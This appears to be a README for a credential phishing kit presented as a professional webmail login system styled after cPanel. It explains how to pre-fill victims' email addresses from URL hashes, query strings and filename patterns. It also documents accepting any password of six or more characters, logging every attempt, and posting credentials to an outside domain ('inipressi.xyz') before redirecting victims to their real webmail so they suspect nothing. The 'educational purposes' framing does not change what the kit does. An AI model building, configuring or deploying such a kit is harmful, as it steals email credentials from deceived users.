# Webmail Login System

A professional webmail login interface that provides a seamless experience for users to access their email accounts across different domains. The system automatically extracts email addresses from URLs and redirects users to their respective webmail services.

## Features

### 🚀 Core Functionality
- **Smart Email Detection**: Automatically extracts email addresses from:
  - URL hash fragments (`#user@domain.com`)
  - Query parameters (`?email=user@domain.com`)
  - Filename patterns (`index.html@user@domain.com`)
  - URL path patterns
- **Dynamic Redirects**: Automatically redirects to `webmail.{domain}` based on email domain
- **Form Validation**: Client-side email format validation and required field checks
- **Loading States**: Professional loading overlay during authentication
- **Error Handling**: Comprehensive error messages and status indicators

### 🎨 User Interface
- **Responsive Design**: Mobile-friendly layout that adapts to different screen sizes
- **Professional Styling**: Clean, modern interface inspired by cPanel webmail
- **Visual Feedback**: Success/error indicators with icons and color coding
- **Auto-focus**: Smart form field focusing for better user experience
- **Email Highlighting**: Visual feedback when email is auto-populated

### 🔧 Technical Features
- **AJAX Form Submission**: Asynchronous form processing without page refresh
- **Multiple Redirect Methods**: Fallback mechanisms for reliable redirection
- **Cross-Origin Support**: CORS-enabled for external API integration
- **Logging System**: Server-side logging of login attempts
- **Security Headers**: Proper HTTP headers and input validation

## Project Structure

```
/
├── index.html          # Main login page
├── style.css          # Stylesheet with responsive design
├── script.js          # JavaScript functionality
├── postmailer.php     # PHP backend for form processing
├── login_attempts.log # Generated log file (created automatically)
└── README.md          # This documentation
```

## Setup Instructions

### Prerequisites
- Web server with PHP support (Apache, Nginx, etc.)
- PHP 7.4 or higher
- Write permissions for log file creation

### Installation

1. **Clone or Download** the project files to your web server directory
2. **Configure Permissions** (if using log functionality):
   ```bash
   chmod 644 login_attempts.log
   chmod 755 .
   ```
3. **Update Configuration** in `script.js`:
   - Modify the `REDIRECT_DELAY` variable if needed
   - Update the AJAX URL in the form submission handler
   - Customize the fallback domain in `getWebmailUrl()`

### Local Development

For local testing, you can use PHP's built-in server:

```bash
cd /path/to/project
php -S localhost:8000
```

Then open `http://localhost:8000` in your browser.

## Usage

### Basic Usage
1. Open `index.html` in a web browser
2. Enter email address and password
3. Click "Log in" to authenticate
4. System will redirect to the appropriate webmail service

### URL-based Email Population

The system supports several methods to auto-populate the email field:

#### Hash Fragment
```
https://yourdomain.com/index.html#user@example.com
```

#### Query Parameters
```
https://yourdomain.com/index.html?email=user@example.com
https://yourdomain.com/index.html?user=user@example.com
```

#### Filename Pattern
```
https://yourdomain.com/index.html@user@example.com
```

### Backend Configuration

The PHP backend (`postmailer.php`) can be customized for different authentication methods:

#### Current Demo Logic
- Accepts any email with password length ≥ 6 characters
- Logs all attempts to `login_attempts.log`
- Returns JSON responses with appropriate HTTP status codes

#### Customization Options
1. **Database Integration**: Replace the demo validation with database queries
2. **External API**: Connect to existing authentication services
3. **Email Notifications**: Add PHPMailer integration for notifications
4. **Rate Limiting**: Implement IP-based rate limiting
5. **Session Management**: Add session handling for authenticated users

## Configuration

### JavaScript Settings (`script.js`)

```javascript
// Redirect delay after successful login
var REDIRECT_DELAY = 1500; // milliseconds

// Backend endpoint
url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php'

// Fallback domain
return 'https://webmail.gracedrive.org';
```

### PHP Settings (`postmailer.php`)

```php
// Log file location
$log_file = 'login_attempts.log';

// Validation logic
if (strlen($password) >= 6) {
    $is_valid_login = true;
}
```

## API Response Format

### Success Response
```json
{
    "signal": "OK",
    "success": true,
    "msg": "Login successful! Redirecting to webmail...",
    "email": "user@example.com",
    "domain": "example.com",
    "redirect_url": "https://webmail.example.com"
}
```

### Error Response
```json
{
    "signal": "ERROR",
    "success": false,
    "msg": "Invalid email or password. Please try again.",
    "attempt": 1
}
```

## Security Considerations

1. **Input Validation**: All inputs are validated both client-side and server-side
2. **CSRF Protection**: Consider adding CSRF tokens for production use
3. **Rate Limiting**: Implement rate limiting to prevent brute force attacks
4. **HTTPS**: Always use HTTPS in production environments
5. **Log Security**: Ensure log files are not publicly accessible
6. **Password Handling**: Passwords are not stored, only validated

## Browser Compatibility

- **Modern Browsers**: Chrome, Firefox, Safari, Edge (latest versions)
- **Mobile Browsers**: iOS Safari, Chrome Mobile, Samsung Internet
- **JavaScript Required**: The application requires JavaScript to be enabled

## Troubleshooting

### Common Issues

1. **CORS Errors**: Ensure proper CORS headers are set in the PHP backend
2. **File Permissions**: Check write permissions for log file creation
3. **JavaScript Errors**: Open browser developer tools to check for console errors
4. **Redirect Issues**: Verify the target webmail domains are accessible

### Debug Mode

Enable console logging by opening browser developer tools. The application logs:
- Email extraction attempts
- AJAX request/response details
- Redirect attempts
- Error conditions

## License

This project is provided as-is for educational and development purposes. Please ensure compliance with applicable laws and regulations when implementing in production environments.

## Support

For issues and questions:
1. Check the browser console for JavaScript errors
2. Verify PHP error logs for backend issues
3. Ensure all file permissions are correctly set
4. Test with different browsers and devices